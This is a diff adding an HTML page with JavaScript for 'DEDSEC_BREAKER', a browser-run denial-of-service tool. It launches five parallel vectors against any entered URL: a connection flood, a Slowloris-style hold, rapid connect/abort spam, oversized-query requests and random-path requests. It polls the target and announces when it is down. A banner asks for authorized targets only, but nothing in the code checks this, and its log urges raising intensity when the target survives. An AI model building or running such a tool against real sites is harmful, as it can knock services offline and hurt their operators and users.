@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DEDSEC_BREAKER — Availability Tester</title>
+<style>
+    /* ═══════════════════════════════════════════ *
+     *  DEDSEC THEME — DARK CYBERPUNK            *
+     * ═══════════════════════════════════════════ */
+
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+        --green: #00ff41;
+        --dark-green: #003b00;
+        --cyan: #0ff;
+        --red: #ff003c;
+        --yellow: #ffd000;
+        --bg: #0a0a0a;
+        --panel: #0d0d0d;
+        --border: #1a1a1a;
+        --text: #c0c0c0;
+        --glow-green: 0 0 10px #00ff41, 0 0 30px #00ff4144;
+        --glow-red: 0 0 10px #ff003c, 0 0 30px #ff003c44;
+        --glow-cyan: 0 0 10px #0ff, 0 0 30px #0ff44;
+    }
+
+    body {
+        background: var(--bg);
+        color: var(--text);
+        font-family: 'Share Tech Mono', monospace;
+        min-height: 100vh;
+        overflow-x: hidden;
+    }
+
+    /* ─── Scanline overlay ─── */
+    body::after {
+        content: '';
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        background: repeating-linear-gradient(
+            0deg,
+            transparent,
+            transparent 2px,
+            rgba(0,255,65,0.015) 2px,
+            rgba(0,255,65,0.015) 4px
+        );
+        pointer-events: none;
+        z-index: 9999;
+    }
+
+    /* ─── Background grid ─── */
+    body::before {
+        content: '';
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        background:
+            linear-gradient(rgba(0,255,65,0.03) 1px, transparent 1px),
+            linear-gradient(90deg, rgba(0,255,65,0.03) 1px, transparent 1px);
+        background-size: 40px 40px;
+        pointer-events: none;
+        z-index: -1;
+    }
+
+    /* ─── Container ─── */
+    .container {
+        max-width: 1100px;
+        margin: 0 auto;
+        padding: 20px;
+        position: relative;
+        z-index: 1;
+    }
+
+    /* ─── Banner ─── */
+    .banner {
+        text-align: center;
+        padding: 30px 0 10px;
+        position: relative;
+    }
+
+    .banner pre {
+        color: var(--green);
+        font-size: 8px;
+        line-height: 1.1;
+        text-shadow: var(--glow-green);
+        animation: flicker 3s infinite;
+        display: inline-block;
+    }
+
+    @keyframes flicker {
+        0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+            text-shadow: var(--glow-green);
+        }
+        20%, 24%, 55% {
+            text-shadow: none;
+        }
+    }
+
+    .banner h1 {
+        font-family: 'Orbitron', monospace;
+        font-size: 28px;
+        color: var(--green);
+        text-shadow: var(--glow-green);
+        letter-spacing: 6px;
+        margin-top: -10px;
+    }
+
+    .banner .subtitle {
+        font-size: 13px;
+        color: var(--cyan);
+        text-shadow: var(--glow-cyan);
+        opacity: 0.8;
+        margin-top: 4px;
+        letter-spacing: 3px;
+    }
+
+    .banner .divider {
+        border: none;
+        height: 1px;
+        background: linear-gradient(90deg, transparent, var(--green), var(--cyan), var(--green), transparent);
+        margin: 15px auto;
+        width: 80%;
+        box-shadow: var(--glow-green);
+    }
+
+    /* ─── Warning bar ─── */
+    .warning {
+        background: rgba(255,0,60,0.1);
+        border: 1px solid var(--red);
+        border-radius: 4px;
+        padding: 12px 18px;
+        margin: 15px 0;
+        text-align: center;
+        color: var(--red);
+        font-size: 13px;
+        text-shadow: 0 0 5px var(--red);
+        animation: pulse-warn 2s infinite;
+    }
+
+    @keyframes pulse-warn {
+        0%, 100% { box-shadow: 0 0 5px rgba(255,0,60,0.3); }
+        50% { box-shadow: 0 0 20px rgba(255,0,60,0.6); }
+    }
+
+    .warning strong {
+        color: #fff;
+    }
+
+    /* ─── Input panel ─── */
+    .input-panel {
+        background: var(--panel);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        padding: 25px;
+        margin: 20px 0;
+        box-shadow: 0 0 15px rgba(0,255,65,0.05);
+    }
+
+    .input-panel label {
+        display: block;
+        color: var(--cyan);
+        font-size: 14px;
+        letter-spacing: 2px;
+        margin-bottom: 10px;
+    }
+
+    .input-row {
+        display: flex;
+        gap: 10px;
+        flex-wrap: wrap;
+    }
+
+    .input-row input {
+        flex: 1;
+        min-width: 250px;
+        background: #111;
+        border: 1px solid #333;
+        border-radius: 4px;
+        padding: 14px 16px;
+        color: var(--green);
+        font-family: 'Share Tech Mono', monospace;
+        font-size: 15px;
+        outline: none;
+        transition: border-color 0.3s, box-shadow 0.3s;
+    }
+
+    .input-row input:focus {
+        border-color: var(--green);
+        box-shadow: 0 0 10px rgba(0,255,65,0.2);
+    }
+
+    .input-row input::placeholder {
+        color: #444;
+    }
+
+    .btn {
+        padding: 14px 30px;
+        border: none;
+        border-radius: 4px;
+        font-family: 'Orbitron', monospace;
+        font-size: 13px;
+        font-weight: 700;
+        letter-spacing: 2px;
+        cursor: pointer;
+        transition: all 0.3s;
+        text-transform: uppercase;
+    }
+
+    .btn-launch {
+        background: var(--green);
+        color: #000;
+        box-shadow: 0 0 15px rgba(0,255,65,0.3);
+    }
+    .btn-launch:hover {
+        box-shadow: 0 0 30px rgba(0,255,65,0.6);
+        transform: scale(1.02);
+    }
+    .btn-launch:disabled {
+        opacity: 0.4;
+        cursor: not-allowed;
+        transform: none;
+    }
+
+    .btn-stop {
+        background: var(--red);
+        color: #fff;
+        box-shadow: 0 0 15px rgba(255,0,60,0.3);
+    }
+    .btn-stop:hover {
+        box-shadow: 0 0 30px rgba(255,0,60,0.6);
+        transform: scale(1.02);
+    }
+
+    .btn-abort {
+        background: transparent;
+        color: var(--red);
+        border: 1px solid var(--red);
+    }
+    .btn-abort:hover {
+        background: rgba(255,0,60,0.1);
+    }
+
+    /* ─── Status display ─── */
+    .status-bar {
+        display: flex;
+        gap: 15px;
+        flex-wrap: wrap;
+        margin: 15px 0;
+    }
+
+    .status-card {
+        flex: 1;
+        min-width: 120px;
+        background: var(--panel);
+        border: 1px solid var(--border);
+        border-radius: 4px;
+        padding: 15px;
+        text-align: center;
+    }
+
+    .status-card .label {
+        font-size: 10px;
+        color: #666;
+        letter-spacing: 2px;
+        text-transform: uppercase;
+    }
+
+    .status-card .value {
+        font-size: 28px;
+        font-family: 'Orbitron', monospace;
+        margin-top: 5px;
+    }
+
+    .status-card .value.alive {
+        color: var(--green);
+        text-shadow: var(--glow-green);
+    }
+    .status-card .value.dead {
+        color: var(--red);
+        text-shadow: var(--glow-red);
+    }
+    .status-card .value.waiting {
+        color: var(--yellow);
+        text-shadow: 0 0 10px var(--yellow);
+    }
+
+    /* ─── Vectors panel ─── */
+    .vectors {
+        margin: 15px 0;
+    }
+
+    .vector-item {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 10px 14px;
+        margin: 4px 0;
+        background: var(--panel);
+        border: 1px solid var(--border);
+        border-radius: 4px;
+        font-size: 13px;
+        transition: all 0.3s;
+    }
+
+    .vector-item .icon {
+        width: 28px;
+        text-align: center;
+        font-size: 16px;
+    }
+
+    .vector-item .name {
+        flex: 1;
+        color: #aaa;
+    }
+
+    .vector-item .status-tag {
+        font-size: 10px;
+        padding: 4px 10px;
+        border-radius: 3px;
+        letter-spacing: 1px;
+        text-transform: uppercase;
+    }
+
+    .status-tag.idle {
+        background: #1a1a1a;
+        color: #555;
+    }
+    .status-tag.active {
+        background: rgba(0,255,65,0.15);
+        color: var(--green);
+        animation: pulse-tag 1.5s infinite;
+    }
+    .status-tag.done {
+        background: rgba(0,255,65,0.08);
+        color: var(--green);
+    }
+    .status-tag.fail {
+        background: rgba(255,0,60,0.15);
+        color: var(--red);
+    }
+
+    @keyframes pulse-tag {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.5; }
+    }
+
+    /* ─── Log console ─── */
+    .console {
+        background: #050505;
+        border: 1px solid #1a1a1a;
+        border-radius: 4px;
+        margin: 15px 0;
+        padding: 0;
+        max-height: 300px;
+        overflow-y: auto;
+        font-size: 12px;
+        line-height: 1.6;
+    }
+
+    .console-header {
+        padding: 8px 14px;
+        background: #0a0a0a;
+        border-bottom: 1px solid #1a1a1a;
+        color: #555;
+        font-size: 10px;
+        letter-spacing: 2px;
+        text-transform: uppercase;
+        position: sticky;
+        top: 0;
+        z-index: 2;
+    }
+
+    .console-content {
+        padding: 10px 14px;
+    }
+
+    .console-content .line {
+        opacity: 0.9;
+        word-break: break-all;
+    }
+
+    .console-content .line .time {
+        color: #444;
+    }
+    .console-content .line .ok {
+        color: var(--green);
+    }
+    .console-content .line .warn {
+        color: var(--yellow);
+    }
+    .console-content .line .err {
+        color: var(--red);
+    }
+    .console-content .line .info {
+        color: var(--cyan);
+    }
+
+    /* ─── Results panel (hidden until done) ─── */
+    .results-panel {
+        display: none;
+        background: var(--panel);
+        border: 1px solid var(--green);
+        border-radius: 6px;
+        padding: 25px;
+        margin: 20px 0;
+        box-shadow: 0 0 20px rgba(0,255,65,0.1);
+    }
+
+    .results-panel.visible {
+        display: block;
+        animation: fadeIn 0.5s;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    .results-panel h2 {
+        font-family: 'Orbitron', monospace;
+        font-size: 18px;
+        color: var(--green);
+        text-shadow: var(--glow-green);
+        margin-bottom: 15px;
+        letter-spacing: 3px;
+    }
+
+    .result-item {
+        display: flex;
+        justify-content: space-between;
+        padding: 10px 0;
+        border-bottom: 1px solid #1a1a1a;
+        font-size: 13px;
+    }
+
+    .result-item:last-child {
+        border-bottom: none;
+    }
+
+    .verdict {
+        text-align: center;
+        padding: 20px;
+        margin-top: 15px;
+        border-radius: 4px;
+        font-family: 'Orbitron', monospace;
+        font-size: 20px;
+        letter-spacing: 4px;
+    }
+
+    .verdict.down {
+        color: var(--red);
+        text-shadow: var(--glow-red);
+        border: 1px solid var(--red);
+        background: rgba(255,0,60,0.05);
+    }
+
+    .verdict.alive {
+        color: var(--green);
+        text-shadow: var(--glow-green);
+        border: 1px solid var(--green);
+        background: rgba(0,255,65,0.05);
+    }
+
+    /* ─── Footer ─── */
+    .footer {
+        text-align: center;
+        padding: 30px 0 10px;
+        font-size: 11px;
+        color: #333;
+        letter-spacing: 2px;
+    }
+
+    .footer span {
+        color: var(--green);
+    }
+
+    /* ─── Scrollbar ─── */
+    ::-webkit-scrollbar {
+        width: 4px;
+    }
+    ::-webkit-scrollbar-track {
+        background: #0a0a0a;
+    }
+    ::-webkit-scrollbar-thumb {
+        background: var(--green);
+        border-radius: 2px;
+    }
+
+    /* ─── Loading dots ─── */
+    .loading-dots::after {
+        content: '';
+        animation: dots 1.5s infinite;
+    }
+    @keyframes dots {
+        0% { content: ''; }
+        25% { content: '.'; }
+        50% { content: '..'; }
+        75% { content: '...'; }
+    }
+
+    /* ─── Responsive ─── */
+    @media (max-width: 600px) {
+        .banner pre { font-size: 4px; }
+        .banner h1 { font-size: 18px; letter-spacing: 3px; }
+        .input-row { flex-direction: column; }
+        .input-row input { min-width: auto; }
+        .btn { width: 100%; }
+        .status-card { min-width: 80px; }
+        .status-card .value { font-size: 20px; }
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- ═══ BANNER ═══ -->
+    <div class="banner">
+        <pre>
+╔══════════════════════════════════════════════╗
+║   ██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗
+║   ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝
+║   ██║  ██║█████╗  ██║  ██║███████╗█████╗  ██║
+║   ██║  ██║██╔══╝  ██║  ██║╚════██║██╔══╝  ██║
+║   ██████╔╝███████╗██████╔╝███████║███████╗╚██████╗
+║   ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝
+║         ██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗
+║         ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝
+║         ██████╔╝██████╔╝█████╗  ███████║█████╔╝
+║         ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗
+║         ██████╔╝██║  ██║███████╗██║  ██║██║  ██╗
+║         ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
+╚══════════════════════════════════════════════╝
+        </pre>
+        <h1>// DEDSEC_BREAKER //</h1>
+        <div class="subtitle">⟁ AVAILABILITY STRESS TEST ⟁</div>
+        <hr class="divider">
+    </div>
+
+    <!-- ═══ WARNING ═══ -->
+    <div class="warning">
+        <strong>⚠️ AUTHORIZED TARGETS ONLY</strong> — You must own or have written permission for the target below.<br>
+        This tool will attempt to make the target <strong>unreachable</strong>. Use at your own risk.
+    </div>
+
+    <!-- ═══ INPUT PANEL ═══ -->
+    <div class="input-panel" id="inputPanel">
+        <label>⟅ ENTER TARGET URL ⟆</label>
+        <div class="input-row">
+            <input type="text" id="targetUrl" placeholder="http://your-site.com" value="http://localhost:8080">
+            <button class="btn btn-launch" id="btnLaunch" onclick="startAttack()">⏵ LAUNCH</button>
+            <button class="btn btn-abort" id="btnAbort" onclick="stopAttack()" style="display:none;">⏹ ABORT</button>
+        </div>
+    </div>
+
+    <!-- ═══ STATUS CARDS ═══ -->
+    <div class="status-bar">
+        <div class="status-card">
+            <div class="label">Target</div>
+            <div class="value waiting" id="targetDisplay">—</div>
+        </div>
+        <div class="status-card">
+            <div class="label">Status</div>
+            <div class="value waiting" id="aliveDisplay">⏳ IDLE</div>
+        </div>
+        <div class="status-card">
+            <div class="label">Elapsed</div>
+            <div class="value waiting" id="elapsedDisplay">00:00</div>
+        </div>
+        <div class="status-card">
+            <div class="label">Threads</div>
+            <div class="value waiting" id="threadDisplay">0</div>
+        </div>
+    </div>
+
+    <!-- ═══ VECTORS ═══ -->
+    <div class="vectors">
+        <div class="vector-item">
+            <span class="icon">🧵</span>
+            <span class="name">Connection Flood (2000 threads)</span>
+            <span class="status-tag idle" id="v1">⏳ Idle</span>
+        </div>
+        <div class="vector-item">
+            <span class="icon">🐌</span>
+            <span class="name">Slowloris (500 threads)</span>
+            <span class="status-tag idle" id="v2">⏳ Idle</span>
+        </div>
+        <div class="vector-item">
+            <span class="icon">⚡</span>
+            <span class="name">RST Spam (30s burst)</span>
+            <span class="status-tag idle" id="v3">⏳ Idle</span>
+        </div>
+        <div class="vector-item">
+            <span class="icon">💣</span>
+            <span class="name">Big Payload (500 threads, 1MB each)</span>
+            <span class="status-tag idle" id="v4">⏳ Idle</span>
+        </div>
+        <div class="vector-item">
+            <span class="icon">🌀</span>
+            <span class="name">Path Bomb (300 threads)</span>
+            <span class="status-tag idle" id="v5">⏳ Idle</span>
+        </div>
+    </div>
+
+    <!-- ═══ CONSOLE ═══ -->
+    <div class="console" id="console">
+        <div class="console-header">⧩ Operator Console</div>
+        <div class="console-content" id="consoleContent">
+            <div class="line"><span class="info">⟫ DEDSEC_BREAKER v1.0 initialized. Awaiting target...</span></div>
+        </div>
+    </div>
+
+    <!-- ═══ RESULTS ═══ -->
+    <div class="results-panel" id="resultsPanel">
+        <h2>📋 FINAL REPORT</h2>
+        <div id="resultsContent"></div>
+        <div class="verdict" id="verdictDisplay">⟁ VERDICT PENDING ⟁</div>
+    </div>
+
+    <!-- ═══ FOOTER ═══ -->
+    <div class="footer">
+        <span>♦</span> DEDSEC_BREAKER v1.0 — <span>♦</span><br>
+        "We are ghosts. We see everything."
+    </div>
+
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════════════════════
+//  DEDSEC_BREAKER — Frontend DoS Engine
+//  Pure JavaScript — runs entirely in the browser
+//  FOR USE AGAINST YOUR OWN AUTHORIZED TARGETS ONLY
+// ═══════════════════════════════════════════════════════════════════════════
+
+// ─── State ─────────────────────────────────────────────────────────────────
+let attackRunning = false;
+let stopRequested = false;
+let targetHost = '';
+let targetPort = 80;
+let targetSsl = false;
+let elapsedInterval = null;
+let monitorInterval = null;
+let startTime = null;
+let aliveCount = 0;
+let deadCount = 0;
+let totalThreads = 0;
+
+// ─── DOM refs ──────────────────────────────────────────────────────────────
+const $ = id => document.getElementById(id);
+const logConsole = $('consoleContent');
+const targetDisplay = $('targetDisplay');
+const aliveDisplay = $('aliveDisplay');
+const elapsedDisplay = $('elapsedDisplay');
+const threadDisplay = $('threadDisplay');
+const resultsPanel = $('resultsPanel');
+const resultsContent = $('resultsContent');
+const verdictDisplay = $('verdictDisplay');
+const btnLaunch = $('btnLaunch');
+const btnAbort = $('btnAbort');
+
+// ─── Parse URL ─────────────────────────────────────────────────────────────
+function parseTarget(url) {
+    try {
+        const u = new URL(url);
+        return {
+            host: u.hostname,
+            port: parseInt(u.port) || (u.protocol === 'https:' ? 443 : 80),
+            ssl: u.protocol === 'https:',
+            path: u.pathname || '/'
+        };
+    } catch(e) {
+        return null;
+    }
+}
+
+// ─── Logging ───────────────────────────────────────────────────────────────
+function log(msg, type = 'info') {
+    const t = new Date().toLocaleTimeString();
+    const line = document.createElement('div');
+    line.className = 'line';
+    line.innerHTML = `<span class="time">[${t}]</span> <span class="${type}">${msg}</span>`;
+    logConsole.appendChild(line);
+    logConsole.scrollTop = logConsole.scrollHeight;
+}
+
+// ─── Set vector status ─────────────────────────────────────────────────────
+function setVector(id, status) {
+    const el = $(id);
+    if (!el) return;
+    const map = { idle: '⏳ Idle', active: '▶ Active', done: '✅ Done', fail: '❌ Fail' };
+    el.textContent = map[status] || status;
+    el.className = 'status-tag ' + status;
+}
+
+// ─── Update alive status ───────────────────────────────────────────────────
+function setAlive(alive) {
+    if (alive) {
+        aliveDisplay.textContent = '🟢 ALIVE';
+        aliveDisplay.className = 'value alive';
+        aliveCount++;
+    } else {
+        aliveDisplay.textContent = '🔴 DOWN';
+        aliveDisplay.className = 'value dead';
+        deadCount++;
+        if (attackRunning) {
+            log('🚨 TARGET IS DOWN!', 'err');
+        }
+    }
+}
+
+// ─── Check if target responds ──────────────────────────────────────────────
+async function checkAlive() {
+    const url = (targetSsl ? 'https' : 'http') + '://' + targetHost + ':' + targetPort + '/';
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 4000);
+    try {
+        const res = await fetch(url, {
+            method: 'GET',
+            mode: 'no-cors',
+            signal: controller.signal
+        });
+        clearTimeout(timeout);
+        return true;
+    } catch(e) {
+        clearTimeout(timeout);
+        return false;
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  ATTACK VECTORS
+// ═══════════════════════════════════════════════════════════════════════════
+
+// ─── Vector 1: Connection Flood ───────────────────────────────────────────
+async function vectorFlood(count = 2000) {
+    setVector('v1', 'active');
+    log(`🧵 Connection flood: spawning ${count} connections...`, 'ok');
+    const promises = [];
+    for (let i = 0; i < count; i++) {
+        if (stopRequested) break;
+        promises.push((async () => {
+            try {
+                const c = new AbortController();
+                const timeout = setTimeout(() => c.abort(), 5000);
+                const url = (targetSsl ? 'https' : 'http') + '://' + targetHost + ':' + targetPort + '/?x=' + i;
+                await fetch(url, {
+                    mode: 'no-cors',
+                    signal: c.signal,
+                    cache: 'no-store'
+                });
+                clearTimeout(timeout);
+            } catch(e) {}
+        })());
+        // Throttle to avoid browser limits
+        if (i % 100 === 0) {
+            await new Promise(r => setTimeout(r, 10));
+            threadDisplay.textContent = Math.min(i + 1, count);
+        }
+    }
+    await Promise.allSettled(promises);
+    setVector('v1', stopRequested ? 'fail' : 'done');
+    log(`🧵 Connection flood: ${stopRequested ? 'ABORTED' : 'DONE'}`, stopRequested ? 'warn' : 'ok');
+}
+
+// ─── Vector 2: Slowloris ──────────────────────────────────────────────────
+async function vectorSlowloris(count = 500) {
+    setVector('v2', 'active');
+    log(`🐌 Slowloris: spawning ${count} partial connections...`, 'ok');
+    const promises = [];
+    for (let i = 0; i < count; i++) {
+        if (stopRequested) break;
+        promises.push((async () => {
+            try {
+                const c = new AbortController();
+                const url = (targetSsl ? 'https' : 'http') + '://' + targetHost + ':' + targetPort + '/';
+                // Send request but never finish reading — hold connection
+                await fetch(url, {
+                    mode: 'no-cors',
+                    signal: c.signal,
+                    cache: 'no-store',
+                    // Don't await response — keep connection open
+                });
+                // Sleep to hold the connection
+                await new Promise(r => setTimeout(r, 30000));
+            } catch(e) {}
+        })());
+        if (i % 50 === 0) await new Promise(r => setTimeout(r, 5));
+    }
+    await Promise.allSettled(promises);
+    setVector('v2', stopRequested ? 'fail' : 'done');
+    log(`🐌 Slowloris: ${stopRequested ? 'ABORTED' : 'DONE'}`, stopRequested ? 'warn' : 'ok');
+}
+
+// ─── Vector 3: RST Spam ──────────────────────────────────────────────────
+async function vectorRstSpam(duration = 15) {
+    setVector('v3', 'active');
+    log(`⚡ RST spam: rapid connect/disconnect for ${duration}s...`, 'ok');
+    const deadline = Date.now() + (duration * 1000);
+    let count = 0;
+    while (!stopRequested && Date.now() < deadline) {
+        try {
+            const c = new AbortController();
+            setTimeout(() => c.abort(), 100);
+            const url = (targetSsl ? 'https' : 'http') + '://' + targetHost + ':' + targetPort + '/rst?' + count;
+            await fetch(url, { mode: 'no-cors', signal: c.signal });
+        } catch(e) {}
+        count++;
+        if (count % 200 === 0) {
+            threadDisplay.textContent = totalThreads + count;
+            await new Promise(r => setTimeout(r, 5));
+        }
+    }
+    setVector('v3', stopRequested ? 'fail' : 'done');
+    log(`⚡ RST spam: ${count} connections cycled`, 'ok');
+}
+
+// ─── Vector 4: Big Payload ────────────────────────────────────────────────
+async function vectorBigPayload(threads = 500) {
+    setVector('v4', 'active');
+    log(`💣 Big payload: ${threads} threads with large POST bodies...`, 'ok');
+    // Note: no-cors mode limits what we can send; we'll use GET with large query params
+    const bigQuery = 'a'.repeat(10000); // 10KB query param
+    const promises = [];
+    for (let i = 0; i < threads; i++) {
+        if (stopRequested) break;
+        promises.push((async () => {
+            try {
+                const c = new AbortController();
+                setTimeout(() => c.abort(), 3000);
+                const url = (targetSsl ? 'https' : 'http') + '://' + targetHost + ':' + targetPort + '/big?' + bigQuery + '&i=' + i;
+                await fetch(url, { mode: 'no-cors', signal: c.signal });
+            } catch(e) {}
+        })());
+        if (i % 50 === 0) await new Promise(r => setTimeout(r, 5));
+    }
+    await Promise.allSettled(promises);
+    setVector('v4', stopRequested ? 'fail' : 'done');
+    log(`💣 Big payload: ${stopRequested ? 'ABORTED' : 'DONE'}`, stopRequested ? 'warn' : 'ok');
+}
+
+// ─── Vector 5: Path Bomb ──────────────────────────────────────────────────
+async function vectorPathBomb(threads = 300) {
+    setVector('v5', 'active');
+    log(`🌀 Path bomb: ${threads} threads hitting random deep paths...`, 'ok');
+    const promises = [];
+    for (let i = 0; i < threads; i++) {
+        if (stopRequested) break;
+        const randPath = '/' + Math.random().toString(36).slice(2, 10) + '/' + Math.random().toString(36).slice(2, 10) + '.php?id=' + Math.floor(Math.random() * 999999);
+        promises.push((async () => {
+            try {
+                const c = new AbortController();
+                setTimeout(() => c.abort(), 3000);
+                const url = (targetSsl ? 'https' : 'http') + '://' + targetHost + ':' + targetPort + randPath;
+                await fetch(url, { mode: 'no-cors', signal: c.signal });
+            } catch(e) {}
+        })());
+        if (i % 50 === 0) await new Promise(r => setTimeout(r, 5));
+    }
+    await Promise.allSettled(promises);
+    setVector('v5', stopRequested ? 'fail' : 'done');
+    log(`🌀 Path bomb: ${stopRequested ? 'ABORTED' : 'DONE'}`, stopRequested ? 'warn' : 'ok');
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  MAIN ATTACK CONTROLLER
+// ═══════════════════════════════════════════════════════════════════════════
+
+async function startAttack() {
+    const rawUrl = $('targetUrl').value.trim();
+    if (!rawUrl) {
+        log('❌ Please enter a target URL.', 'err');
+        return;
+    }
+
+    const parsed = parseTarget(rawUrl);
+    if (!parsed) {
+        log('❌ Invalid URL format. Use: http://host:port', 'err');
+        return;
+    }
+
+    // Reset state
+    attackRunning = true;
+    stopRequested = false;
+    aliveCount = 0;
+    deadCount = 0;
+    totalThreads = 0;
+    targetHost = parsed.host;
+    targetPort = parsed.port;
+    targetSsl = parsed.ssl;
+    startTime = Date.now();
+
+    // UI changes
+    btnLaunch.style.display = 'none';
+    btnAbort.style.display = 'inline-block';
+    resultsPanel.classList.remove('visible');
+    logConsole.innerHTML = '';
+    targetDisplay.textContent = targetHost + ':' + targetPort;
+    targetDisplay.className = 'value alive';
+
+    log(`🎯 Target locked: ${targetHost}:${targetPort} (${targetSsl ? 'HTTPS' : 'HTTP'})`, 'info');
+    log(`⚔️ Deploying all vectors...`, 'ok');
+
+    // Start elapsed timer
+    if (elapsedInterval) clearInterval(elapsedInterval);
+    elapsedInterval = setInterval(() => {
+        if (!startTime) return;
+        const sec = Math.floor((Date.now() - startTime) / 1000);
+        const m = String(Math.floor(sec / 60)).padStart(2, '0');
+        const s = String(sec % 60).padStart(2, '0');
+        elapsedDisplay.textContent = m + ':' + s;
+    }, 200);
+
+    // Start monitor
+    if (monitorInterval) clearInterval(monitorInterval);
+    monitorInterval = setInterval(async () => {
+        if (!attackRunning) return;
+        const alive = await checkAlive();
+        setAlive(alive);
+    }, 3000);
+
+    // ─── Launch all vectors in parallel ─────────────────────────────────
+    try {
+        await Promise.all([
+            vectorFlood(2000),
+            vectorSlowloris(500),
+            vectorRstSpam(15),
+            vectorBigPayload(500),
+            vectorPathBomb(300),
+        ]);
+    } catch(e) {
+        log(`❌ Vector error: ${e.message}`, 'err');
+    }
+
+    // ─── Cleanup ────────────────────────────────────────────────────────
+    attackRunning = false;
+    clearInterval(monitorInterval);
+    clearInterval(elapsedInterval);
+
+    btnLaunch.style.display = 'inline-block';
+    btnAbort.style.display = 'none';
+
+    // ─── Final check ────────────────────────────────────────────────────
+    log('⏳ Performing final health check...', 'info');
+    await new Promise(r => setTimeout(r, 2000));
+    const finalAlive = await checkAlive();
+
+    // ─── Show results ───────────────────────────────────────────────────
+    const elapsed = Math.floor((Date.now() - startTime) / 1000);
+    resultsContent.innerHTML = `
+        <div class="result-item"><span>Target</span><span>${targetHost}:${targetPort}</span></div>
+        <div class="result-item"><span>Test Duration</span><span>${elapsed}s</span></div>
+        <div class="result-item"><span>Alive Checks Passed</span><span>${aliveCount}</span></div>
+        <div class="result-item"><span>Down Checks</span><span>${deadCount}</span></div>
+        <div class="result-item"><span>Final Status</span><span>${finalAlive ? '🟢 ALIVE' : '🔴 DOWN'}</span></div>
+    `;
+
+    if (finalAlive) {
+        verdictDisplay.textContent = '⟁ TARGET SURVIVED ⟁';
+        verdictDisplay.className = 'verdict alive';
+        log('🟢 Target survived the assault. Increase intensity or duration.', 'warn');
+    } else {
+        verdictDisplay.textContent = '⟁ VULNERABILITY CONFIRMED — TARGET IS DOWN ⟁';
+        verdictDisplay.className = 'verdict down';
+        log('🔴 Target is DOWN. DoS vulnerability confirmed.', 'err');
+    }
+
+    resultsPanel.classList.add('visible');
+    resultsPanel.scrollIntoView({ behavior: 'smooth' });
+
+    log('🏁 Operation complete. DedSec out.', 'info');
+}
+
+// ─── Stop ──────────────────────────────────────────────────────────────────
+function stopAttack() {
+    if (!attackRunning) return;
+    stopRequested = true;
+    log('⛔ ABORT SIGNAL — Shutting down vectors...', 'warn');
+    btnAbort.disabled = true;
+    btnAbort.textContent = '⏹ STOPPING...';
+    setTimeout(() => {
+        btnAbort.disabled = false;
+        btnAbort.textContent = '⏹ ABORT';
+    }, 2000);
+}
+
+// ─── Enter key to launch ───────────────────────────────────────────────────
+document.getElementById('targetUrl').addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' && !attackRunning) startAttack();
+});
+</script>
+</body>
+</html>
